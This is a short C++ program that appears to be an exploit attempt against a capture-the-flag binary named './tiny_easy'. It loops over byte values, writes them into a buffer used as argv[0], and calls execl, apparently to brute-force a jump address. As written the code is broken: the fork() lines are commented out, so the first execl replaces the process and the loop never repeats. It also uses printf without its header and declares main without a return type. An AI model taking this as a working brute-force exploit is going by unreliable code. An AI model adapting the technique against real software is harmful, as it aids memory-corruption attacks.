#include <unistd.h>
#include <iostream>
#include <string>

using namespace std;

main()
{
char address[5]= "\x01\x01\x01\xff";

for (int a=1;a<255;a++ ){
for (int b=1;b<255;b++ ){
for (int c=1;c<255;c++ ){

address[0]=(char)c;
address[1]=(char)b;
address[2]=(char)a;

//int pid = fork();
//	if (pid==0) {
      		execl("./tiny_easy", address, (char *) 0);
//		}
	printf("| %x |",*address);
}}}}

